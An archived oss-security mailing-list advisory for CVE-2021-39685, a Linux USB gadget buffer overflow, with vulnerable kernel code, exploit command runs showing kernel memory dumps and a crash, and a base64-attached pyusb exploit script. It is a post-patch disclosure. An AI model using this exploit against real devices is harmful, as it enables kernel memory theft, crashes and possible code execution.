X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["17558" "Wednesday" "15" "December" "2021" "22:22:33" "+0100" "Szymon Heidrich" "szymon.heidrich@gmail.com" nil "351" "[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow" nil nil nil "12" nil nil (number mark "U       szymon.heidr Dec 15  351/17558 " thread-indent "\"[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4054 invoked by uid 550); 15 Dec 2021 21:44:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21537 invoked from network); 15 Dec 2021 21:22:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=message-id:date:mime-version:user-agent:content-language:from
         :subject:to:cc;
        bh=FsmnOoqiA//GG97UCNOUC3Avep7xwrO/tTM1YxMz4GU=;
        b=MhsS5vcUXTOuCkV/32yLqpZNn9SoKCNWm0QfrKKwQzr+qA4rf8egfkCWMMr3Te8LRg
         +huGAx48d/YZbayr3MMnbXTy5GHiuBKCEQDIJXsoUfJfnlPRYcbKCq5Vaf74Vj0Lo6Wv
         JGOEpMGPqr95mq4Py/2cAi1dz2w2UWBuZE4w4VST2ZtAMMFbhk+/dvBNSRvdSuJc7lxg
         7c834Mzz3zk/wh8QVDpRA4pB2b9up9GilKtuqnKyTG9hsdBtwW75PWzPWF/qz6vDrgcW
         0uw1AVIPkvmfgQ+3jQh1+QH4sayuMo9rqD1cTUSjR9Xmet30PDGD9qcrdbsU5M3UZB/K
         xHXQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:message-id:date:mime-version:user-agent
         :content-language:from:subject:to:cc;
        bh=FsmnOoqiA//GG97UCNOUC3Avep7xwrO/tTM1YxMz4GU=;
        b=yHcOIcI/+klOBg6GCl8SHuL7SOO26BBdZetObo9nwtEc5t3BQGCG3Tzor/XkyF8MAD
         fkg9t57en5ynOn0Ma+A7KQfh7FGUovreyWKntHO31mM75qCZzbLO+1SKoSud4k7GGm7q
         dwiDlLbvb9548AMhQO6HK0E0MMaQGELgk7KVHVHGaijoadCMQUkTQGrjyTy77vyeGySC
         ZZrRZ/Nl78Vne8gWyfx8psoqCWTqmFLyUF9faXYRQIhBe1kSU+PysVyUXcw7EYGHhqTA
         sVoZWTukqeG4CApMW76YFUV/kXT/3RW1CwTTDKcwFuw6Vr6tFKOQ0YbGbB7MMvSfNFX8
         ZDMw==
X-Gm-Message-State: AOAM5306NafapgYgDniFdMfdsTfCg7q1uXCxfXGl4DwKwzqlb18fWsKc
	GrHR7yAmiC3pAGCXLxGKxIhxOl4qqM3eZQ==
X-Google-Smtp-Source: ABdhPJw94nElkSHGnBTpUGhpDFYVoHKfN8GyAjF5nG5XLNAB81Ndma0A/8KEOCY/Rb0Jycm+c3UAYA==
X-Received: by 2002:a2e:7805:: with SMTP id t5mr11816525ljc.507.1639603358790;
        Wed, 15 Dec 2021 13:22:38 -0800 (PST)
Content-Type: multipart/mixed; boundary="------------ij6TTlDZPiBme4myj3pEvvaH"
Message-ID: <942e362d-2a16-883f-5ff9-a466ee6202f8@gmail.com>
Date: Wed, 15 Dec 2021 22:22:33 +0100
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0)
 Gecko/20100101 Thunderbird/91.4.0
Content-Language: en-US
From: Szymon Heidrich <szymon.heidrich@gmail.com>
To: oss-security@lists.openwall.com
Cc: Greg KH <greg@kroah.com>
Subject: [oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow

--------------ij6TTlDZPiBme4myj3pEvvaH
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Hello,

As some of you might have already observed a buffer overflow vulnerability
was recently patched in the Linux USB Gadget subsystem.

TLTR; The issue reported to the Linux security team allowed one to read 
and/or write up to 65kB of kernel memory past buffer boundaries by exploiting
lack of limiting of the usb control transfer request wLength in certain
gadget functions.

You can find more details below. I also attached a sample exploit script
based on pyusb to this message. You can also find a up to date version
on my github under https://github.com/szymonh/inspector-gadget.

Best regards,
Szymon

---

Summary

An attacker can access kernel memory bypassing valid buffer boundaries by exploiting implementation of control request handlers in the following usb gadgets - rndis, hid, uac1, uac1_legacy and uac2. Processing of malicious control transfer requests with unexpectedly large wLength lacks assurance that this value does not exceed the buffer size. Due to this fact one is capable of reading and/or writing (depending on particular case) up to 65k of kernel memory.

Description

Some execution paths of usb control transfer handlers of gadgets such as rndis, hid, uac1, uac1_legacy and uac2 do not include proper handling of request length (wLength). This value should be limited to buffer size to prevent buffer overflow vulnerabilities in the data transfer phase. 

The buffer used by endpoint 0 is allocated in composite.c with size of USB_COMP_EP0_BUFSIZ (4096) bytes so
setting wLength to a value greater than USB_COMP_EP0_BUFSIZ will result in a buffer overflow.

For example in the case of f_uac1.c, execution of the f_audio_setup function allows one to perform both reads and writes past buffer boundaries. Neither f_audio_setup nor none of the called functions - audio_set_endpoint_req, audio_get_endpoint_req, out_rq_cur, ac_rq_in limit the return value to be smaller than the buffer size. Consequently the data transfer phase uses req->length = value = ctrl->wLength which is controlled by the attacker. This allows one to either read or write up to 65k bytes of kernel memory depending on the control transfer direction.

    static int
    f_audio_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
    {
            struct usb_composite_dev *cdev = f->config->cdev;
            struct usb_request      *req = cdev->req;
            int                     value = -EOPNOTSUPP;
            u16                     w_index = le16_to_cpu(ctrl->wIndex);
            u16                     w_value = le16_to_cpu(ctrl->wValue);
            u16                     w_length = le16_to_cpu(ctrl->wLength);

            /* composite driver infrastructure handles everything; interface
             * activation uses set_alt().
             */
            switch (ctrl->bRequestType) {
            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
                    value = audio_set_endpoint_req(f, ctrl);
                    break;

            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
                    value = audio_get_endpoint_req(f, ctrl);
                    break;
            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
                    if (ctrl->bRequest == UAC_SET_CUR)
                            value = out_rq_cur(f, ctrl);
                    break;
            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
                    value = ac_rq_in(f, ctrl);
                    break;
            default:
                    ERROR(cdev, "invalid control req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
            }

            /* respond with data transfer or status phase? */
            if (value >= 0) {
                    DBG(cdev, "audio req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
                    req->zero = 0;
                    req->length = value;
                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);

                    if (value < 0)
                            ERROR(cdev, "audio response on err %d\n", value);
            }

            /* device either stalls (value < 0) or reports success */
            return value;
    } 

 
Execution of the sample readout exploit allows dumping of up to 65k of memory.

    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | wc -c
    65535

     

    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | strings

    nsole=tty1 root=PARTUUID=e02024cb-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait modules-load=dwc2
    tem.slice/system-getty.slice/getty@ttyGS0.service
    !rE*
    ?& .4!
    0usb_composite_setup_continue
    composite_setup
    usb_gadget_get_string
    usb_otg_descriptor_init
    usb_otg_descriptor_alloc
    usb_free_all_descriptors
    usb_assign_descriptors
    usb_copy_descriptors

    usb_gadget_config_buf 


On the other hand, execution of the overwrite exploit allows one to write arbitrary data past expected buffer boundaries.

    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d write


    Message from syslogd@zero at Dec  6 19:56:01 ...
     kernel:[  103.850206] Internal error: Oops: 5 [#1] ARM


Similarly in case of the rndis gadget the rndis_setup function can be exploited to write past buffer boundaries using control transfer request with direction out, type class, recipient interface and bRequest set to USB_CDC_SEND_ENCAPSULATED_COMMAND. 

    static int
    rndis_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
    {
            struct f_rndis          *rndis = func_to_rndis(f);
            struct usb_composite_dev *cdev = f->config->cdev;
            struct usb_request      *req = cdev->req;
            int                     value = -EOPNOTSUPP;
            u16                     w_index = le16_to_cpu(ctrl->wIndex);
            u16                     w_value = le16_to_cpu(ctrl->wValue);
            u16                     w_length = le16_to_cpu(ctrl->wLength);
            /* composite driver infrastructure handles everything except
             * CDC class messages; interface activation uses set_alt().
             */
            switch ((ctrl->bRequestType << 8) | ctrl->bRequest) {
            /* RNDIS uses the CDC command encapsulation mechanism to implement
             * an RPC scheme, with much getting/setting of attributes by OID.
             */
            case ((USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE) << 8)
                            | USB_CDC_SEND_ENCAPSULATED_COMMAND:
                    if (w_value || w_index != rndis->ctrl_id)
                            goto invalid;
                    /* read the request; process it later */
                    value = w_length;
                    req->complete = rndis_command_complete;
                    req->context = rndis;
                    /* later, rndis_response_available() sends a notification */
                    break;

     ... 

     ...

            /* respond with data transfer or status phase? */
            if (value >= 0) {
                    DBG(cdev, "rndis req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
                    req->zero = (value < w_length);
                    req->length = value;
                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);
                    if (value < 0)
                            ERROR(cdev, "rndis response on err %d\n", value);
            }
            /* device either stalls (value < 0) or reports success */
            return value;

    } 


Vulnerable execution paths:
- f_rndis.c
    - rndis_setup
- f_uac1.c
    - out_rq_cur
    - ac_rq_in
    - audio_set_endpoint_req
    - audio_get_endpoint_req
- f_uac1_legacy.c
    - audio_set_intf_req
    - audio_set_endpoint_req
    - audio_get_endpoint_req
- f_uac2.c
    - out_rq_cur
- f_hid.c
    - hid_gsetup for HID_REQ_SET_REPORT case

Impact

Devices implementing affected usb device gadget classes (rndis, hid, uac1, uac1_legacy, uac2) may be affected by buffer overflow vulnerabilities resulting in information disclosure, denial of service or execution of arbitrary code in kernel context.

Expected resolution

Limit the transfer phase size to min(len, buffer_size) in affected control request handlers to assure that a buffer overflow will not occur.

Key dates

- 07.12.2021 - reported the issue to Kernel security team
- 09.12.2021 - draft patch provided by Kernel security team
- 12.12.2021 - fix merged to main Linux kernel tree (public)


I attached sample exploits based on pyusb. For optimal results libusb on the malicious host should be compiled with support for large request transfer messages (MAX_CTRL_BUFFER_LENGTH). 

--------------ij6TTlDZPiBme4myj3pEvvaH
Content-Type: text/x-python-script; charset=UTF-8; name="gadget.py"
Content-Disposition: attachment; filename="gadget.py"
Content-Transfer-Encoding: base64

IyEvdXNyL2Jpbi9weXRob24zCgojCiMgQ1ZFLTIwMjEtMzk2ODUKIwojIFRo
aXMgc2FtcGxlIHNjcmlwdCBhdHRlbXB0cyB0byBleHBsb2l0IGxhY2sKIyBv
ZiBjb250cm9sIHRyYW5zZmVyIHJlcXVlc3Qgd0xlbmd0aCBsaW1pdGluZwoj
IGJ5IExpbnV4IGtlcm5lbCdzIFVTQiBnYWRnZXQgc3Vic3lzdGVtLgojCiMg
RXhwbG9pdGFibGUgZnVuY3Rpb25zIGluY2x1ZGUgcm5kaXMsIGhpZCwKIyB1
YWMxLCB1YWMxX2xlZ2FjeSwgdWFjMi4KIwojIE9uIHRoZSBob3N0IHNpZGUg
dXNlIGEgY3VzdG9tIGJ1aWxkIG9mIGxpYnVzYgojIHdpdGggTUFYX0NUUkxf
QlVGRkVSX0xFTkdUSCBpbmNyZWFzZWQgdG8gMHhmZmZmCiMgZnJvbSBkZWZh
dWx0IHZhbHVlIG9mIDQwOTYuCiMKIyBUaGUgRVAwIGJ1ZmZlciBhcyBhbGxv
Y2F0ZWQgaW4gY29tcG9zaXRlLmMgaXMKIyBVU0JfQ09NUF9FUDBfQlVGU0la
IGJ5dGVzIGxhcmdlIHNvIGV2ZXJ5dGhpbmcgcGFzdAojIDQwOTYgd2lsbCBj
YXVzZSBidWZmZXIgb3ZlcmZsb3cuCiMKIyBVc2Ugc2FtcGxlczoKIyBzdWRv
IC4vZ2FkZ2V0LnB5IC12IDB4MThkMSAtcCAweDRlMjMgLWYgcm5kaXMKIyBz
dWRvIC4vZ2FkZ2V0LnB5IC12IDB4MWI2NyAtcCAweDQwMGMgLWYgdWFjMSAt
ZCByZWFkCiMKIyBUaGlzIHNjcmlwdCByZXF1aXJlcyBweXVzYi4KIwojIGh0
dHBzOi8vZ2l0aHViLmNvbS9zenltb25oL2luc3BlY3Rvci1nYWRnZXQKIwoK
aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzeXMKCmltcG9ydCB1c2IuY29yZQpp
bXBvcnQgdXNiLnV0aWwKCgpDVFJMX1JFUV9NQVAgPSB7CiAgICAndWFjMSc6
IHsKICAgICAgICAncmVhZCc6IHsKICAgICAgICAgICAgJ2JtUmVxdWVzdFR5
cGUnOiAweGEyLCAgICAgICAgICAgICAgICAjIFVTQl9ESVJfSU4gfCBVU0Jf
VFlQRV9DTEFTUyB8IFVTQl9SRUNJUF9FTkRQT0lOVAogICAgICAgICAgICAn
YlJlcXVlc3QnOiAxMjksICAgICAgICAgICAgICAgICAgICAgICMgVUFDX0dF
VF9DVVIKICAgICAgICAgICAgJ3dWYWx1ZSc6IDB4MDAsCiAgICAgICAgICAg
ICd3SW5kZXgnOiAweDAwLAogICAgICAgIH0sCiAgICAgICAgJ3dyaXRlJzog
ewogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjIsICAgICAgICAg
ICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8IFVTQl9S
RUNJUF9FTkRQT0lOVAogICAgICAgICAgICAnYlJlcXVlc3QnOiAweDAxLCAg
ICAgICAgICAgICAgICAgICAgICMgVUFDX1NFVF9DVVIKICAgICAgICAgICAg
J3dWYWx1ZSc6IDB4MDAsCiAgICAgICAgICAgICd3SW5kZXgnOiAweDAwLAog
ICAgICAgIH0KICAgIH0sCiAgICAndWFjMV9sZWdhY3knOiB7CiAgICAgICAg
J3JlYWQnOiB7CiAgICAgICAgICAgICdibVJlcXVlc3RUeXBlJzogMHhhMiwg
ICAgICAgICAgICAgICAgIyBVU0JfRElSX0lOIHwgVVNCX1RZUEVfQ0xBU1Mg
fCBVU0JfUkVDSVBfRU5EUE9JTlQKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
MTI5LCAgICAgICAgICAgICAgICAgICAgICAjIFVBQ19HRVRfQ1VSCiAgICAg
ICAgICAgICd3VmFsdWUnOiAweDAwLAogICAgICAgICAgICAnd0luZGV4Jzog
MHgwMCwKICAgICAgICB9LAogICAgICAgICd3cml0ZSc6IHsKICAgICAgICAg
ICAgJ2JtUmVxdWVzdFR5cGUnOiAweDIyLCAgICAgICAgICAgICAgICAjIFVT
Ql9ESVJfT1VUIHwgVVNCX1RZUEVfQ0xBU1MgfCBVU0JfUkVDSVBfRU5EUE9J
TlQKICAgICAgICAgICAgJ2JSZXF1ZXN0JzogMHgwMSwgICAgICAgICAgICAg
ICAgICAgICAjIFVBQ19TRVRfQ1VSCiAgICAgICAgICAgICd3VmFsdWUnOiAw
eDAwLAogICAgICAgICAgICAnd0luZGV4JzogMHgwMCwKICAgICAgICB9CiAg
ICB9LAogICAgJ3VhYzInOiB7CiAgICAgICAgJ3dyaXRlJzogewogICAgICAg
ICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAgICAgICAgICAgICAgICMg
VVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8IFVTQl9SRUNJUF9JTlRF
UkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0JzogMSwgICAgICAgICAgICAg
ICAgICAgICAgICAjIFVBQzJfQ1NfQ1VSCiAgICAgICAgICAgICd3VmFsdWUn
OiAoMHgwMSA8PCA4KSwgICAgICAgICAgICAgICAgIyBoaWdoZXIgYnl0ZSBz
ZXQgdG8gVUFDMl9DU19DT05UUk9MX1NBTV9GUkVRCiAgICAgICAgICAgICd3
SW5kZXgnOiAwLCAgICAgICAgICAgICAgICAgICAgICAgICAgIyBsb3dlciBi
eXRlIHNldCB0byB1YWMyLT5hY19pbnRmLCBoaWdoZXIgVVNCX0lOX0NMS19J
RAogICAgICAgIH0KICAgIH0sCiAgICAncm5kaXMnOiB7CiAgICAgICAgJ3dy
aXRlJzogewogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAg
ICAgICAgICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8
IFVTQl9SRUNJUF9JTlRFUkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
MHgwMCwgICAgICAgICAgICAgICAgICAgICAjIFVTQl9DRENfU0VORF9FTkNB
UFNVTEFURURfQ09NTUFORAogICAgICAgICAgICAnd1ZhbHVlJzogMHgwMCwg
ICAgICAgICAgICAgICAgICAgICAgICMgbmVlZHMgdG8gYmUgMAogICAgICAg
ICAgICAnd0luZGV4JzogMHgwMCwgICAgICAgICAgICAgICAgICAgICAgICMg
bXVzdCBiZSBzZXQgdG8gcm5kaXMtPmN0cmxfaWQKICAgICAgICB9CiAgICB9
LAogICAgJ2hpZCc6IHsKICAgICAgICAnd3JpdGUnOiB7ICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAjIGhpZGctPnVzZV9vdXRfZXAgbXVzdCBi
ZSBmYWxzZQogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAg
ICAgICAgICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8
IFVTQl9SRUNJUF9JTlRFUkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
MHgwOSwgICAgICAgICAgICAgICAgICAgICAjIEhJRF9SRVFfU0VUX1JFUE9S
VAogICAgICAgICAgICAnd1ZhbHVlJzogMHgwMCwgICAgICAgICAgICAgICAg
ICAgICAgICMgZG9uJ3QgY2FyZQogICAgICAgICAgICAnd0luZGV4JzogMHgw
MCwgICAgICAgICAgICAgICAgICAgICAgICMgZG9uJ3QgY2FyZQogICAgICAg
IH0KICAgIH0KfQoKCmRlZiBhdXRvX2ludCh2YWw6IHN0cikgLT4gaW50Ogog
ICAgJycnQ29udmVydCBhcmJpdHJhcnkgc3RyaW5nIHRvIGludGVnZXIKCiAg
ICBVc2VkIGFzIGFyZ3BhcnNlIHR5cGUgdG8gYXV0b21hdGljYWxseSBoYW5k
bGUgaW5wdXQgd2l0aAogICAgZGlmZmVyZW50IGJhc2UgLSBkZWNpbWFsLCBv
Y3RhbCwgaGV4IGV0Yy4KCiAgICAnJycKICAgIHJldHVybiBpbnQodmFsLCAw
KQoKCmRlZiBwYXJzZV9hcmdzKCkgLT4gYXJncGFyc2UuTmFtZXNwYWNlOgog
ICAgJycnUGFyc2UgY29tbWFuZCBsaW5lIGFyZ3VtZW50cwoKICAgICcnJwog
ICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoCiAgICAgICAg
ZGVzY3JpcHRpb249J1NhbXBsZSBleHBsb2l0IGZvciBSTkRJUyBnYWRnZXQg
Y2xhc3MnCiAgICApCgogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLXYnLCAn
LS12aWQnLCAgdHlwZT1hdXRvX2ludCwgcmVxdWlyZWQ9VHJ1ZSwKICAgICAg
ICAgICAgICAgICAgICAgICAgaGVscD0ndmVuZG9yIGlkJykKICAgIHBhcnNl
ci5hZGRfYXJndW1lbnQoJy1wJywgJy0tcGlkJywgdHlwZT1hdXRvX2ludCwg
cmVxdWlyZWQ9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgaGVscD0n
cHJvZHVjdCBpZCcpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctbCcsICct
LWxlbmd0aCcsIHR5cGU9YXV0b19pbnQsIGRlZmF1bHQ9MHhmZmZmLAogICAg
ICAgICAgICAgICAgICAgICAgICByZXF1aXJlZD1GYWxzZSwgaGVscD0nbGVu
Z2h0IG9mIGRhdGEgdG8gd3JpdGUnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVu
dCgnLWQnLCAnLS1kaXJlY3Rpb24nLCB0eXBlPXN0ciwgZGVmYXVsdD0ncmVh
ZCcsCiAgICAgICAgICAgICAgICAgICAgICAgIGNob2ljZXM9WydyZWFkJywg
J3dyaXRlJ10sCiAgICAgICAgICAgICAgICAgICAgICAgIGhlbHA9J2RpcmVj
dGlvbiBvZiBvcGVyYXRpb24gZnJvbSBob3N0IHBlcnNwZWN0aXZlJykKICAg
IHBhcnNlci5hZGRfYXJndW1lbnQoJy1mJywgJy0tZnVuY3Rpb24nLCB0eXBl
PXN0ciwgZGVmYXVsdD0ncm5kaXMnLAogICAgICAgICAgICAgICAgICAgICAg
ICBjaG9pY2VzPSgncm5kaXMnLCAndWFjMScsICd1YWMxX2xlZ2FjeScsICd1
YWMyJywgJ2hpZCcpKQoKICAgIHJldHVybiBwYXJzZXIucGFyc2VfYXJncygp
CgoKZGVmIHNldHVwX2RldmljZShhcmdzOiBhcmdwYXJzZS5OYW1lc3BhY2Up
OgogICAgJycnRmluZCBhbmQgcHJlcGFyZSB0aGUgdXNiIGRldmljZQoKICAg
ICcnJwogICAgdXNiZGV2ID0gdXNiLmNvcmUuZmluZChpZFZlbmRvcj1hcmdz
LnZpZCwgaWRQcm9kdWN0PWFyZ3MucGlkKQogICAgaWYgdXNiZGV2IGlzIE5v
bmU6CiAgICAgICAgcHJpbnQoJ0RldmljZSBub3QgZm91bmQsIHZlcmlmeSBz
cGVjaWZpZWQgVklEIGFuZCBQSUQnKQogICAgICAgIHN5cy5leGl0KDEpCgog
ICAgZm9yIGNmZyBpbiB1c2JkZXY6CiAgICAgICAgZm9yIGlkeCBpbiByYW5n
ZShjZmcuYk51bUludGVyZmFjZXMpOgogICAgICAgICAgICBpZiB1c2JkZXYu
aXNfa2VybmVsX2RyaXZlcl9hY3RpdmUoaWR4KToKICAgICAgICAgICAgICAg
IHVzYmRldi5kZXRhY2hfa2VybmVsX2RyaXZlcihpZHgpCiAgICB1c2JkZXYu
c2V0X2NvbmZpZ3VyYXRpb24oKQogICAgcmV0dXJuIHVzYmRldgoKCmRlZiBi
dWlsZF9wYXlsb2FkKGxlbmd0aDogaW50KSAtPiBieXRlYXJyYXk6CiAgICAn
JydQcm92aWRlIGEgcGF5bG9hZCB0byB1c2UKCiAgICBUaGlzIHNob3VsZCBp
bmNsdWRlIHNvbWUgbmljZSBjb2RlIGJ1dCBmb3IKICAgIHB1cmUgZGVtbyBB
cyBzaG91bGQgYmUgZmluZS4KCiAgICAnJycKICAgIHBheWxvYWQgPSBieXRl
YXJyYXkoKQogICAgZm9yIGkgaW4gcmFuZ2UoMCwgbGVuZ3RoKToKICAgICAg
ICBwYXlsb2FkLmFwcGVuZChvcmQoJ0EnKSkKICAgIHJldHVybiBwYXlsb2Fk
CgoKZGVmIHBpY2tfcmVxdWVzdChhcmdzOiBhcmdwYXJzZS5OYW1lc3BhY2Up
IC0+IGRpY3Q6CiAgICAnJydDaG9vc2UgY29udHJvbCB0cmFuc2ZlciByZXF1
ZXN0CgogICAgJycnCiAgICBpZiBhcmdzLmRpcmVjdGlvbiBub3QgaW4gQ1RS
TF9SRVFfTUFQW2FyZ3MuZnVuY3Rpb25dOgogICAgICAgIGFyZ3MuZGlyZWN0
aW9uID0gbGlzdChDVFJMX1JFUV9NQVBbYXJncy5mdW5jdGlvbl0ua2V5cygp
KVswXQoKICAgIGN0cmxfcmVxID0gQ1RSTF9SRVFfTUFQW2FyZ3MuZnVuY3Rp
b25dW2FyZ3MuZGlyZWN0aW9uXQoKICAgIGlmIGFyZ3MuZGlyZWN0aW9uID09
ICdyZWFkJzoKICAgICAgICBjdHJsX3JlcVsnZGF0YV9vcl93TGVuZ3RoJ10g
PSBhcmdzLmxlbmd0aAogICAgZWxzZToKICAgICAgICBjdHJsX3JlcVsnZGF0
YV9vcl93TGVuZ3RoJ10gPSBidWlsZF9wYXlsb2FkKGFyZ3MubGVuZ3RoKQoK
ICAgIHJldHVybiBjdHJsX3JlcQoKCmRlZiBwcmVzZW50X3Jlc3BvbnNlKGFy
Z3M6IGFyZ3BhcnNlLk5hbWVzcGFjZSwgZGF0YSkgLT4gTm9uZToKICAgICcn
J1ByZXNlbnQgdGhlIHJldHJpZXZlZCBtZW0gY29udGVudHMgZm9yIHJlYWQK
CiAgICAnJycKICAgIGlmIGFyZ3MuZGlyZWN0aW9uID09ICd3cml0ZSc6CiAg
ICAgICAgcHJpbnQoJ1dyb3RlIHt9IGJ5dGVzIG9mIGRhdGEnLmZvcm1hdChk
YXRhKSkKICAgICAgICBwcmludCgnUGxlYXNlIGNoZWNrIHRoZSBkZXZpY2Ug
c3RhdGUnKQogICAgZWxzZToKICAgICAgICBzeXMuc3Rkb3V0LmJ1ZmZlci53
cml0ZShkYXRhKQoKCmRlZiBleHBsb2l0KGFyZ3M6IGFyZ3BhcnNlLk5hbWVz
cGFjZSkgLT4gTm9uZToKICAgICcnJ0V4cGxvaXQgdGhlIEdhZGdldAoKICAg
ICcnJwogICAgdXNiZGV2ID0gc2V0dXBfZGV2aWNlKGFyZ3MpCiAgICBjdHJs
X3JlcSA9IHBpY2tfcmVxdWVzdChhcmdzKQogICAgZGF0YSA9IHVzYmRldi5j
dHJsX3RyYW5zZmVyKCoqY3RybF9yZXEpCiAgICBwcmVzZW50X3Jlc3BvbnNl
KGFyZ3MsIGRhdGEpCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAg
ICcnJ01haW4gc2NyaXB0CgogICAgJycnCiAgICBleHBsb2l0KHBhcnNlX2Fy
Z3MoKSkK

--------------ij6TTlDZPiBme4myj3pEvvaH--

